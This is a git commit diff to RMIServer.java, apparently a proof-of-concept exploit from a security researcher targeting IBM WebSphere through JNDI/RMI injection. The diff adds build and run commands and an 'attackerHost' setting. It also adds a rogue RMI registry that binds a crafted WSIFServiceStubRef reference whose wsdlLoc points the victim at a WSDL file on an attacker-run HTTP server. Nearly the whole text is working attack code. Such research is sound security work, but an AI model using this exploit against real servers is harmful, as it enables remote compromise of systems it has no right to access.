dcc6563ff74e928b0017ee4fcd8af36789d993c3
b <vpbalint@silentsignal.hu>
2021-08-16 16:19:51 +0200

    working

--- RMIServer.java
+++ RMIServer.java
@@ -7,11 +7,17 @@ import org.apache.wsif.naming.*;
 import javax.naming.*;
 import com.sun.jndi.rmi.registry.*;
 
+// javac -cp .:plugins/com.ibm.ws.runtime.jar:runtimes/com.ibm.ws.admin.client_9.0.jar --add-modules jdk.naming.rmi --add-exports='jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED' RMIServer.java
+// java -cp .:plugins/com.ibm.ws.runtime.jar:runtimes/com.ibm.ws.admin.client_9.0.jar RMIServer
+
 public class RMIServer {
     public static void main(String[] args) throws Exception {
+        String attackerHost="127.0.0.1";
+        System.setProperty("java.rmi.server.hostname", attackerHost); // While the RMI registry binds to 0.0.0.0, the individual services don't!
         Registry registry = LocateRegistry.createRegistry(1099);
         Reference ref = new Reference(WSIFServiceStubRef.class.getName(), (String) null, (String) null);
-        ref.add(new StringRefAddr("wsdlLoc", "http://169.254.0.117:80/poc.wsdl"));
+        //ref.add(new StringRefAddr("wsdlLoc", "http://172.16.205.1:8000/poc.wsdl"));
+        ref.add(new StringRefAddr("wsdlLoc", "http://"+attackerHost+":8000/poc.wsdl"));
         ref.add(new StringRefAddr("serviceNS", null));
         ref.add(new StringRefAddr("serviceName", null));
         ref.add(new StringRefAddr("portTypeNS", "http://wsifservice.addressbook/"));
